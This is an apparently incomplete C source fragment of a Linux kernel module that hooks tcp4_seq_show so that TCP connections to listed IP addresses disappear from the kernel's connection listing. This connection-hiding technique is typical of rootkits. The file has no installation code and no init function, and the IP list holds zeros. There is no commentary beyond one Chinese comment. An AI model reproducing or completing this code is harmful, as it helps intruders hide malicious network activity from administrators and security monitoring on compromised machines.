#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/inet.h>       // for in_aton
#include <net/inet_sock.h>    // for inet_sk()

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);


static __be32 blacklist_ips[] = {
    0, 0, 0, 0, 0
};

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    int i;

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;

        for (i = 0; i < ARRAY_SIZE(blacklist_ips); i++) {
            if (is->inet_daddr == blacklist_ips[i]) {
                return 0;  // 命中黑名单，直接返回
            }
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}



